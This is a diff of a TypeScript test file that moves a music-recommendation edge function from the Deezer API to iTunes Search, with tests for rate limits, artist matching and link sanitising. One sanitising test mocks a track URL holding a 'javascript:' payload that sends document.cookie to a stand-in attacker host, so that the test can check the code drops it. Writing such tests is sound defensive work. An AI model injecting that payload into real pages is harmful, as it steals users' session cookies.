@@ -172,7 +172,7 @@ it("transcribe-voice tells the client nothing about a missing provider key", asy
   expect(request).not.toHaveBeenCalled();
 });
 
-it("spotify-songs consumes the shared rate limit before any Deezer request", async () => {
+it("spotify-songs consumes the shared rate limit before any iTunes request", async () => {
   const request = vi.spyOn(globalThis, "fetch").mockRejectedValue(new Error("External calls must not occur"));
   const rpc = vi.fn(async () => ({ data: false, error: null }));
   const handler = loadEdgeFunction("spotify-songs", consentingClient({ rpc }));
@@ -231,61 +231,74 @@ it("transcribe-voice still transcribes a full-length 5-minute memo", async () =>
   expect(request.mock.calls[0][0]).toBe("https://api.groq.com/openai/v1/audio/transcriptions");
 });
 
-// Deezer is an unauthenticated third-party API, and its `link` lands in an
-// <a href> on the web and Linking.openURL on mobile. A non-https link has to
-// be dropped at the edge, before it ever reaches a session.
-const deezerReply = (tracks: unknown[]) =>
-  new Response(JSON.stringify({ data: tracks }), { status: 200 });
+// iTunes Search is an unauthenticated third-party API, and its `trackViewUrl`
+// lands in an <a href> on the web and Linking.openURL on mobile. A non-https
+// link has to be dropped at the edge, before it ever reaches a session.
+const itunesReply = (results: unknown[]) =>
+  new Response(JSON.stringify({ resultCount: results.length, results }), { status: 200 });
 
-const deezerTrack = (extra: Record<string, unknown> = {}) => ({
-  id: 12345,
-  title: "Motion Sickness",
-  rank: 500_000,
-  artist: { name: "Phoebe Bridgers" },
-  album: { cover_medium: "https://e-cdns-images.dzcdn.net/cover.jpg" },
+const itunesArtist = (artistId: number, artistName: string, extra: Record<string, unknown> = {}) =>
+  ({ wrapperType: "artist", artistType: "Artist", artistId, artistName, ...extra });
+
+const itunesSong = (extra: Record<string, unknown> = {}) => ({
+  wrapperType: "track",
+  kind: "song",
+  trackId: 12345,
+  trackName: "Motion Sickness",
+  artistName: "Phoebe Bridgers",
+  trackViewUrl: "https://music.apple.com/us/album/motion-sickness/1?i=12345",
+  previewUrl: "https://audio-ssl.itunes.apple.com/clip.m4a",
+  artworkUrl100: "https://is1-ssl.mzstatic.com/image/thumb/a/100x100bb.jpg",
+  releaseDate: "2017-09-22T07:00:00Z",
   ...extra,
 });
 
-it("spotify-songs drops a non-https link Deezer hands back", async () => {
+it("spotify-songs drops a non-https link iTunes hands back", async () => {
   vi.spyOn(globalThis, "fetch").mockImplementation(async () =>
-    deezerReply([deezerTrack({ link: "javascript:fetch('https://attacker.test?c='+document.cookie)" })]),
+    itunesReply([itunesSong({ trackViewUrl: "javascript:fetch('https://attacker.test?c='+document.cookie)" })]),
   );
   const handler = loadEdgeFunction("spotify-songs", consentingClient());
 
   const response = await handler(post({ mood: 3, energy: 3, artists: ["Phoebe Bridgers"] }));
-  const body = (await response.json()) as { picks: { url: string }[] };
+  const body = (await response.json()) as { picks: { url: string }[]; source: string };
 
   expect(response.status).toBe(200);
+  expect(body.source).toBe("itunes");
   expect(body.picks.length).toBeGreaterThan(0);
   for (const pick of body.picks) {
-    expect(pick.url).toBe("https://www.deezer.com/track/12345");
+    expect(pick.url).toBe("https://music.apple.com/us/song/12345");
     expect(pick.url).not.toMatch(/^javascript:/i);
   }
 });
 
-it("spotify-songs keeps a genuine https link and drops non-https media", async () => {
+it("spotify-songs keeps a genuine https link, drops non-https media and sizes up the artwork", async () => {
   vi.spyOn(globalThis, "fetch").mockImplementation(async () =>
-    deezerReply([
-      deezerTrack({
-        link: "https://www.deezer.com/track/12345",
-        preview: "http://cdn-preview.deezer.test/clip.mp3",
-        album: { cover_medium: "javascript:alert(1)", cover_big: "https://e-cdns-images.dzcdn.net/big.jpg" },
-      }),
-    ]),
+    itunesReply([itunesSong({ previewUrl: "http://audio.itunes.test/clip.m4a" })]),
   );
   const handler = loadEdgeFunction("spotify-songs", consentingClient());
 
   const response = await handler(post({ mood: 3, energy: 3, artists: ["Phoebe Bridgers"] }));
   const body = (await response.json()) as {
-    picks: { url: string; previewUrl: string | null; albumArt: string | null }[];
+    picks: { url: string; previewUrl: string | null; albumArt: string | null; releasedAt: string | null }[];
   };
 
   expect(body.picks.length).toBeGreaterThan(0);
   const [pick] = body.picks;
-  expect(pick.url).toBe("https://www.deezer.com/track/12345");
+  expect(pick.url).toBe("https://music.apple.com/us/album/motion-sickness/1?i=12345");
   // Plain http is not https: dropped rather than downgraded silently.
   expect(pick.previewUrl).toBeNull();
-  expect(pick.albumArt).toBe("https://e-cdns-images.dzcdn.net/big.jpg");
+  expect(pick.albumArt).toBe("https://is1-ssl.mzstatic.com/image/thumb/a/300x300bb.jpg");
+  expect(pick.releasedAt).toBe("2017-09-22T07:00:00Z");
+});
+
+it("spotify-songs reports Apple's 403 throttle as a retryable rate limit", async () => {
+  vi.spyOn(globalThis, "fetch").mockImplementation(async () => new Response("", { status: 403 }));
+  const handler = loadEdgeFunction("spotify-songs", consentingClient());
+
+  const response = await handler(post({ mood: 3, energy: 3, artists: ["Phoebe Bridgers"] }));
+
+  expect(response.status).toBe(429);
+  expect(await response.json()).toMatchObject({ error: "Apple Music is busy right now — try again shortly." });
 });
 
 /** A consenting client whose past entries already hold the given song ids. */
@@ -295,34 +308,34 @@ const clientWithHistory = (servedIds: string[]) => consentingClient({
     : { select: () => ({ eq: () => ({ maybeSingle: async () => ({ data: CONSENTING_PROFILE, error: null }) }) }) },
 });
 
-/** Deezer as it answers: an artist lookup, that artist's top tracks, genre searches. */
-const fakeDeezer = (topTracks: ReturnType<typeof deezerTrack>[]) =>
+/** iTunes as it answers: an artist search, that artist's songs, genre searches. */
+const fakeItunes = (songs: ReturnType<typeof itunesSong>[]) =>
   vi.spyOn(globalThis, "fetch").mockImplementation(async (input) => {
     const url = String(input);
     if (url.startsWith("https://api.groq.com")) return new Response("{}", { status: 503 });
-    if (url.includes("/search/artist")) return deezerReply([{ id: 777, name: "Olivia Rodrigo" }]);
-    if (url.includes("/artist/777/top")) return deezerReply(topTracks);
-    return deezerReply([]);
+    if (url.includes("entity=musicArtist")) return itunesReply([itunesArtist(777, "Olivia Rodrigo")]);
+    if (url.includes("/lookup?id=777")) return itunesReply([itunesArtist(777, "Olivia Rodrigo"), ...songs]);
+    return itunesReply([]);
   });
 
 const oliviaTop = Array.from({ length: 20 }, (_, i) =>
-  deezerTrack({ id: 1000 + i, title: `Song ${i}`, artist: { name: "Olivia Rodrigo" } }));
+  itunesSong({ trackId: 1000 + i, trackName: `Song ${i}`, artistName: "Olivia Rodrigo" }));
 
-it("spotify-songs draws from the listed artist's top tracks, not one search hit", async () => {
-  const request = fakeDeezer(oliviaTop);
+it("spotify-songs draws from the listed artist's songs, not one search hit", async () => {
+  const request = fakeItunes(oliviaTop);
   const handler = loadEdgeFunction("spotify-songs", consentingClient());
 
   const response = await handler(post({ mood: 3, energy: 3, artists: ["Olivia Rodrigo"], seed: 5 }));
   const body = (await response.json()) as { picks: { artist: string }[] };
 
-  expect(request.mock.calls.some(([url]) => String(url).includes("/artist/777/top"))).toBe(true);
+  expect(request.mock.calls.some(([url]) => String(url).includes("/lookup?id=777&entity=song"))).toBe(true);
   expect(body.picks.length).toBe(3);
   expect(body.picks.every((p) => p.artist === "Olivia Rodrigo")).toBe(true);
 });
 
 it("spotify-songs skips songs this person was already given", async () => {
-  fakeDeezer(oliviaTop);
-  const served = oliviaTop.slice(0, 17).map((t) => String(t.id));
+  fakeItunes(oliviaTop);
+  const served = oliviaTop.slice(0, 17).map((t) => String(t.trackId));
   const handler = loadEdgeFunction("spotify-songs", clientWithHistory(served));
 
   const response = await handler(post({ mood: 3, energy: 3, artists: ["Olivia Rodrigo"], seed: 1 }));
@@ -339,9 +352,9 @@ it("spotify-songs lets the model choose for the entry, from real candidates only
       expect(prompt).toContain("Feelings: anxious");
       return groqReply({ picks: [{ i: 2, why: "Soft, for an anxious night" }, { i: 99, why: "made up" }] });
     }
-    if (url.includes("/search/artist")) return deezerReply([{ id: 777 }]);
-    if (url.includes("/artist/777/top")) return deezerReply(oliviaTop);
-    return deezerReply([]);
+    if (url.includes("entity=musicArtist")) return itunesReply([itunesArtist(777, "Olivia Rodrigo")]);
+    if (url.includes("/lookup?id=777")) return itunesReply(oliviaTop);
+    return itunesReply([]);
   });
   const handler = loadEdgeFunction("spotify-songs", consentingClient());
 
@@ -358,32 +371,74 @@ it("spotify-songs uses the artist the person picked when two share a name", asyn
   const request = vi.spyOn(globalThis, "fetch").mockImplementation(async (input) => {
     const url = String(input);
     if (url.startsWith("https://api.groq.com")) return new Response("{}", { status: 503 });
-    if (url.includes("/artist/1551/top")) return deezerReply([deezerTrack({ id: 9, title: "Glycerine", artist: { name: "Bush" } })]);
-    return deezerReply([]);
+    if (url.includes("/lookup?id=154751")) return itunesReply([itunesSong({ trackId: 9, trackName: "Glycerine", artistName: "Bush" })]);
+    return itunesReply([]);
+  });
+  const handler = loadEdgeFunction("spotify-songs", consentingClient());
+
+  const response = await handler(post({ mood: 3, energy: 3, artists: ["Bush"], artistIds: { Bush: 154751 }, seed: 1 }));
+  const body = (await response.json()) as { picks: { title: string }[] };
+
+  expect(request.mock.calls.some(([url]) => String(url).includes("entity=musicArtist"))).toBe(false);
+  expect(body.picks[0].title).toBe("Glycerine");
+});
+
+it("spotify-songs ignores a saved Deezer-era artist id that names someone else on iTunes", async () => {
+  const request = vi.spyOn(globalThis, "fetch").mockImplementation(async (input) => {
+    const url = String(input);
+    if (url.startsWith("https://api.groq.com")) return new Response("{}", { status: 503 });
+    // 1551 was Bush on Deezer; on iTunes it is nobody, or somebody else.
+    if (url.includes("/lookup?id=1551")) return itunesReply([itunesSong({ trackId: 5, trackName: "Wrong", artistName: "Someone Else" })]);
+    if (url.includes("entity=musicArtist")) return itunesReply([itunesArtist(154751, "Bush")]);
+    if (url.includes("/lookup?id=154751")) return itunesReply([itunesSong({ trackId: 9, trackName: "Glycerine", artistName: "Bush" })]);
+    return itunesReply([]);
   });
   const handler = loadEdgeFunction("spotify-songs", consentingClient());
 
   const response = await handler(post({ mood: 3, energy: 3, artists: ["Bush"], artistIds: { Bush: 1551 }, seed: 1 }));
   const body = (await response.json()) as { picks: { title: string }[] };
 
-  expect(request.mock.calls.some(([url]) => String(url).includes("/search/artist"))).toBe(false);
-  expect(body.picks[0].title).toBe("Glycerine");
+  expect(request.mock.calls.some(([url]) => String(url).includes("/lookup?id=154751"))).toBe(true);
+  expect(body.picks.map((p) => p.title)).not.toContain("Wrong");
 });
 
-it("spotify-songs picks the most-followed artist of that name when none was chosen", async () => {
+it("spotify-songs takes the first exact name match when none was chosen", async () => {
   const request = vi.spyOn(globalThis, "fetch").mockImplementation(async (input) => {
     const url = String(input);
     if (url.startsWith("https://api.groq.com")) return new Response("{}", { status: 503 });
-    if (url.includes("/search/artist")) return deezerReply([
-      { id: 11656353, name: "Bush", nb_fan: 16 }, { id: 1551, name: "Bush", nb_fan: 216726 }, { id: 1049, name: "Kate Bush", nb_fan: 398888 },
+    if (url.includes("entity=musicArtist")) return itunesReply([
+      itunesArtist(487277, "Kate Bush"), itunesArtist(154751, "Bush"), itunesArtist(1713811691, "Bush"),
     ]);
-    if (url.includes("/artist/1551/top")) return deezerReply([deezerTrack({ id: 9, title: "Glycerine", artist: { name: "Bush" } })]);
-    return deezerReply([]);
+    if (url.includes("/lookup?id=154751")) return itunesReply([itunesSong({ trackId: 9, trackName: "Glycerine", artistName: "Bush" })]);
+    return itunesReply([]);
   });
   const handler = loadEdgeFunction("spotify-songs", consentingClient());
 
   await handler(post({ mood: 3, energy: 3, artists: ["Bush"], seed: 1 }));
 
-  expect(request.mock.calls.some(([url]) => String(url).includes("/artist/1551/top"))).toBe(true);
-  expect(request.mock.calls.some(([url]) => String(url).includes("/artist/11656353"))).toBe(false);
+  expect(request.mock.calls.some(([url]) => String(url).includes("/lookup?id=154751"))).toBe(true);
+  expect(request.mock.calls.some(([url]) => String(url).includes("/lookup?id=1713811691"))).toBe(false);
+  expect(request.mock.calls.some(([url]) => String(url).includes("/lookup?id=487277"))).toBe(false);
+});
+
+const normalizeArtists = async (terms: string[], artists: unknown[]) => {
+  const request = vi.spyOn(globalThis, "fetch").mockImplementation(async () => itunesReply(artists));
+  const handler = loadEdgeFunction("normalize-tag", consentingClient(), { GROQ_API_KEY: undefined });
+  const response = await handler(post({ kind: "artist", terms }));
+  return { request, body: (await response.json()) as { results: { input: string; value: string; source: string }[] } };
+};
+
+it("normalize-tag takes iTunes' own spelling of an exact artist match", async () => {
+  const { request, body } = await normalizeArtists(["beyonce"], [itunesArtist(1, "Beyoncé")]);
+
+  expect(String(request.mock.calls[0][0])).toContain("https://itunes.apple.com/search?media=music&entity=musicArtist");
+  expect(body.results).toEqual([{ input: "beyonce", value: "Beyoncé", source: "canonical" }]);
+});
+
+it("normalize-tag fixes a typo only against iTunes' top hit", async () => {
+  expect((await normalizeArtists(["Olivia Rodrgo"], [itunesArtist(1, "Olivia Rodrigo")])).body.results[0].value).toBe("Olivia Rodrigo");
+  vi.restoreAllMocks();
+  // A soundalike further down the list may not overwrite what they typed.
+  const { body } = await normalizeArtists(["Olivia Rodrgo"], [itunesArtist(2, "Olivia Newton-John"), itunesArtist(1, "Olivia Rodrigo")]);
+  expect(body.results[0].value).toBe("Olivia Rodrgo");
 });
